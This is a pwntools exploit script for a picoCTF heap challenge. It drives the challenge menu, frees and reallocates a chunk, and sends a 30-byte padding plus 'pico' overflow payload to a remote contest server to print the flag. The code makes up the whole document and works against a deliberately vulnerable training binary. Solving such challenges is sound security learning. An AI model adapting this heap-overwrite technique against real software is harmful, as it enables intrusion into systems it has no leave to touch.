#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net",62940)

    return r


def main():
    r = conn()
    r.recvuntil(b"choice:")
    r.sendline(b'5')
    r.recvuntil(b"choice:")
    r.sendline(b'2')
    r.recvuntil(b"allocation: ")
    r.sendline(b'35')
    r.recvuntil(b"flag: ")
    payload =b"A"*30 + b"pico"
    r.sendline(payload)
    r.recvuntil(b"choice:")
    r.sendline(b'4')
    print(r.recv())

    r.interactive()


if __name__ == "__main__":
    main()
